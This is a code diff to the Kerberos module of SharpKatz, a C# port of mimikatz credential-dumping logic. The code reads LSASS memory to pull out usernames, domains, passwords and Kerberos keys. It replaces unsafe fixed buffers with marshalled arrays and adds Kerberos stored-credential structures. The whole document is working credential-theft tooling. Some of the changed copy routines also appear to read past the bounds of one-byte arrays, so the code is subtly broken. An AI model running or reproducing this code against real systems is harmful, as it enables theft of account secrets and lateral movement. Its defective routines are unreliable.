@@ -64,13 +64,14 @@ namespace SharpKatz.Module
         };
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct RTL_BALANCED_LINKS
+        public struct RTL_BALANCED_LINKS
         {
             public IntPtr Parent;//RTL_BALANCED_LINKS
             public IntPtr LeftChild;//RTL_BALANCED_LINKS
             public IntPtr RightChild;//RTL_BALANCED_LINKS
             public byte Balance;
-            public fixed byte Reserved[3]; // align
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
+            public byte[] Reserved; // align
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -230,7 +231,7 @@ namespace SharpKatz.Module
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct LSAISO_DATA_BLOB
+        public struct LSAISO_DATA_BLOB
         {
             public int structSize;
             public int unk0;
@@ -239,22 +240,88 @@ namespace SharpKatz.Module
             public int unk2;
             public int unk3;
             public int unk4;
-            public fixed byte unkKeyData[3 * 16];
-            public fixed byte unkData2[16];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 48)]
+            public byte[] unkKeyData;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            public byte[] unkData2;
             public int unk5;
             public int origSize;
-            public fixed byte data[1];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+            public byte[] data;
         };
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct ENC_LSAISO_DATA_BLOB
+        public struct ENC_LSAISO_DATA_BLOB
         {
-            public fixed byte unkData1[16];
-            public fixed byte unkData2[16];
-            public fixed byte data[1];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            public byte[] unkData1;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+            public byte[] unkData2;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+            public byte[] data;
         }
 
-        public static unsafe List<byte[]> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        [StructLayout(LayoutKind.Sequential)]
+        public struct KERB_STORED_CREDENTIAL
+        {
+            public ushort Revision;
+            public ushort Flags;
+            public ushort CredentialCount;
+            public ushort OldCredentialCount;
+            public ushort DefaultSaltLength;
+            public ushort DefaultSaltMaximumLength;
+            public uint DefaultSaltOffset;
+            //KERB_KEY_DATA	Credentials[ANYSIZE_ARRAY];
+            //KERB_KEY_DATA	OldCredentials[ANYSIZE_ARRAY];
+            //BYTE	DefaultSalt[ANYSIZE_ARRAY];
+            //BYTE	KeyValues[ANYSIZE_ARRAY];
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct KERB_STORED_CREDENTIAL_NEW
+        {
+            public ushort Revision;
+            public ushort Flags;
+            public ushort CredentialCount;
+            public ushort ServiceCredentialCount;
+            public ushort OldCredentialCount;
+            public ushort OlderCredentialCount;
+            public ushort DefaultSaltLength;
+            public ushort DefaultSaltMaximumLength;
+            public uint DefaultSaltOffset;
+            public uint DefaultIterationCount;
+            //KERB_KEY_DATA_NEW	Credentials[ANYSIZE_ARRAY];
+            //KERB_KEY_DATA_NEW	ServiceCredentials[ANYSIZE_ARRAY];
+            //KERB_KEY_DATA_NEW	OldCredentials[ANYSIZE_ARRAY];
+            //KERB_KEY_DATA_NEW	OlderCredentials[ANYSIZE_ARRAY];
+            //BYTE	DefaultSalt[ANYSIZE_ARRAY];
+            //BYTE	KeyValues[ANYSIZE_ARRAY];
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct KERB_KEY_DATA_NEW
+        {
+            public ushort Reserverd1;
+            public ushort Reserverd2;
+            public uint Reserverd3;
+            public uint IterationCount;
+            public int KeyType;
+            public uint KeyLength;
+            public uint KeyOffset;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct KERB_KEY_DATA
+        {
+            public ushort Reserverd1;
+            public ushort Reserverd2;
+            public uint Reserverd3;
+            public int KeyType;
+            public uint KeyLength;
+            public uint KeyOffset;
+        }
+
+        public static List<byte[]> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             IntPtr kerbUnloadLogonSessionTableAddr;
             kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, "kerberos.dll", max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);
@@ -273,12 +340,12 @@ namespace SharpKatz.Module
             return klogonlist;
         }
 
-        private static unsafe void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, List<byte[]> klogonlist, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, List<byte[]> klogonlist, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             if (pElement == null)
                 return;
 
-            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
+            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
             RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
             if (entry.OrderedPointer != IntPtr.Zero)
@@ -295,18 +362,18 @@ namespace SharpKatz.Module
 
         }
 
-        public static unsafe void GetCredentials(ref IntPtr hLsass,byte[] entry, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static void GetCredentials(ref IntPtr hLsass,byte[] entry, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
 
             if (entry == null)
                 return;
 
 
-            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(entry, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, sizeof(LUID)));
+            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(entry, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
 
-            UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionUserNameOffset,sizeof(UNICODE_STRING)));
-            UNICODE_STRING usDomain = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionDomaineOffset, sizeof(UNICODE_STRING)));
-            UNICODE_STRING usPassword = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionPasswordOffset, sizeof(UNICODE_STRING)));
+            UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionUserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
+            UNICODE_STRING usDomain = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionDomaineOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
+            UNICODE_STRING usPassword = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(entry, oshelper.KerberosSessionCredentialOffset + oshelper.KerberosSessionPasswordOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
 
             string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
             string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);
@@ -382,7 +449,7 @@ namespace SharpKatz.Module
             }
         }
 
-        public static unsafe void GetKerberosKeys(ref IntPtr hLsass, byte[] krbrLogonSession, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static void GetKerberosKeys(ref IntPtr hLsass, byte[] krbrLogonSession, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             Type kerberossessiontype = oshelper.KerberosLogonSessionType;
             Type kerberoshshtype = oshelper.KerberosHashType;
@@ -393,22 +460,22 @@ namespace SharpKatz.Module
                 return;
 
             //Console.WriteLine("[*] Kerberos  KeyList found at address {0:X}", pKeyList.ToInt64());
-            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSession, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, sizeof(LUID)));
+            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSession, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
 
-            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Convert.ToUInt64(sizeof(KIWI_KERBEROS_KEYS_LIST_6)));
+            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))));
 
             int items = BitConverter.ToInt32(keylistBytes,Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
             int structsize = Marshal.SizeOf(kerberoshshtype);
 
             int readsize = items * structsize;
 
-            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6)), (ulong)readsize);
+            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), (ulong)readsize);
 
             for (int i = 0; i < items; i++)
             {
                 int currentindex = (i * structsize) + oshelper.KerberosHashGenericOffset;
 
-                byte[] entryBytes = Utility.GetBytes(hashpassBytes, currentindex, sizeof(KERB_HASHPASSWORD_GENERIC));
+                byte[] entryBytes = Utility.GetBytes(hashpassBytes, currentindex, Marshal.SizeOf(typeof(KERB_HASHPASSWORD_GENERIC)));
 
                 KERB_HASHPASSWORD_GENERIC entry = Utility.ReadStruct<KERB_HASHPASSWORD_GENERIC>(entryBytes);
 
@@ -430,14 +497,14 @@ namespace SharpKatz.Module
                     {
                         if ((int)entry.Size <= (Utility.FieldOffset<LSAISO_DATA_BLOB>("data") + ("KerberosKey".Length - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
                         {
-                            byte[] isoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Convert.ToUInt64(sizeof(LSAISO_DATA_BLOB)));
+                            byte[] isoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Convert.ToUInt64(Marshal.SizeOf(typeof(LSAISO_DATA_BLOB))));
                             LSAISO_DATA_BLOB isoblob = Utility.ReadStruct<LSAISO_DATA_BLOB>(isoblobBytes);
 
                             kkey.Key = GenericLsaIsoOutput(isoblob);
                         }
                         else
                         {
-                            byte[] encisoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Convert.ToUInt64(sizeof(LSAISO_DATA_BLOB)));
+                            byte[] encisoblobBytes = Utility.ReadFromLsass(ref hLsass, checksum.Buffer, Convert.ToUInt64(Marshal.SizeOf(typeof(LSAISO_DATA_BLOB))));
                             ENC_LSAISO_DATA_BLOB encisoblob = Utility.ReadStruct<ENC_LSAISO_DATA_BLOB>(encisoblobBytes);
 
                             kkey.Key = GenericEncLsaIsoOutput(encisoblob, (int)entry.Size);
@@ -464,7 +531,7 @@ namespace SharpKatz.Module
             }
         }
 
-        private static string KerberosTicketEtype(int eType)
+        public static string KerberosTicketEtype(int eType)
         {
             string type;
             switch (eType)
@@ -496,21 +563,25 @@ namespace SharpKatz.Module
             return type;
         }
 
-        private static unsafe string GenericLsaIsoOutput(LSAISO_DATA_BLOB blob)
+        private static string GenericLsaIsoOutput(LSAISO_DATA_BLOB blob)
         {
-            IntPtr pntData = (IntPtr)blob.data;
+
+            GCHandle pntDataPinnedArray = GCHandle.Alloc(blob.data, GCHandleType.Pinned);
+            IntPtr pntData = pntDataPinnedArray.AddrOfPinnedObject();
 
             IntPtr pntEncrypted = IntPtr.Add(pntData, blob.typeSize);
-            IntPtr pntUnkData2 = (IntPtr)blob.unkData2;
+
+            GCHandle pntUnkData2PinnedArray = GCHandle.Alloc(blob.unkData2, GCHandleType.Pinned);
+            IntPtr pntUnkData2 = pntUnkData2PinnedArray.AddrOfPinnedObject();
 
             byte[] unkKeyData = new byte[3 * 16];
-            Marshal.Copy((IntPtr)blob.unkKeyData, unkKeyData, 0, 3 * 16);
+            Array.Copy(blob.unkKeyData, unkKeyData, 3 * 16);
 
             byte[] encrypted = new byte[blob.origSize];
             Marshal.Copy(pntEncrypted, encrypted, 0, blob.origSize);
 
             byte[] unkData2 = new byte[16];
-            Marshal.Copy((IntPtr)blob.unkData2, unkData2, 0, 16);
+            Array.Copy(blob.unkData2, unkData2, unkData2.Length);
 
             StringBuilder sb = new StringBuilder();
 
@@ -523,19 +594,22 @@ namespace SharpKatz.Module
             sb.Append(string.Format(Utility.PrintHexBytes(unkData2)));
             sb.Append(string.Format(", 5:0x{0:X}", blob.unk5));
 
+            pntDataPinnedArray.Free();
+            pntUnkData2PinnedArray.Free();
+
             return sb.ToString();
         }
 
-        private static unsafe string GenericEncLsaIsoOutput(ENC_LSAISO_DATA_BLOB blob, int size)
+        private static string GenericEncLsaIsoOutput(ENC_LSAISO_DATA_BLOB blob, int size)
         {
             byte[] unkData1 = new byte[16];
-            Marshal.Copy((IntPtr)blob.unkData1, unkData1, 0, 16);
+            Array.Copy(blob.unkData1, unkData1, unkData1.Length);
 
             byte[] encrypted = new byte[size - Utility.FieldOffset<ENC_LSAISO_DATA_BLOB>("data")];
-            Marshal.Copy((IntPtr)blob.data, encrypted, 0, size - Utility.FieldOffset<ENC_LSAISO_DATA_BLOB>("data"));
+            Array.Copy(blob.data, encrypted, encrypted.Length);
 
             byte[] unkData2 = new byte[16];
-            Marshal.Copy((IntPtr)blob.unkData2, unkData2, 0, 16);
+            Array.Copy(blob.unkData2, unkData2, unkData2.Length);
 
             StringBuilder sb = new StringBuilder();
 
